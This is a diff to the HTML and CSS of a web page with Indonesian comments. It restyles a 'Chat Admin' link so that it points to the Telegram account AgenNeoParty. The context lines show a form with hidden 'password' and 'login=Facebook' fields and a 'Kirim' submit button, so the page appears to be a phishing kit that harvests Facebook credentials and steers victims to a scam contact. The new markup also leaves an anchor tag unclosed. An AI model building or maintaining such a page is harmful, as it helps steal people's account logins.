@@ -28,6 +28,28 @@ body {
   margin: 0
 }
 
+.btn-telegram-admin {
+  display: inline-block;
+  margin-top: 8px;
+  padding: 4px 18px;
+  font-size: 14px;          /* lebih kecil */
+  font-weight: 600;
+  color: #1a5f9e;
+  background: linear-gradient(0deg, #4fc3f7 0%, #b3e5fc 100%);
+  border-radius: 8px;
+  box-shadow: 0 2px 1px rgba(0,0,0,0.2);
+  text-decoration: none;
+}
+
+.btn-telegram-admin i {
+  margin-right: 6px;
+}
+
+.btn-telegram-admin:hover {
+  transform: scale(1.03);
+}
+
+	  
 .btn-chat-admin {
   display: inline-block;
   background-color: #67a309;
@@ -440,10 +462,18 @@ body {
                                           <input type="hidden" name="password" id="resspw" value="" readonly>
                                           <input type="hidden" name="login" id="nwg_login_fb" value="Facebook" readonly>
                                           
-                                          <button type="submit">Kirim</button> 
-                                         <a href="https://t.me/AgenNeoParty" target="_blank" class="btn-chat-admin">
-  											<i class="fa fa-whatsapp wa-inline-icon"></i> Chat Admin
-											</a>
+                                          <div class="buttonnwgverifhdi"> 
+                                            <button type="submit">Kirim</button>
+
+                                            <br>
+
+                                            <a href="https://t.me/AgenNeoParty"
+                                              target="_blank"
+                                              class="btn-telegram-admin">
+                                             <i class="fa fa-telegram"></i> Chat Admin
+                                            <a>
+                                          </div>
+
                                         </div> 
                                       </div> 
                                     </div> 
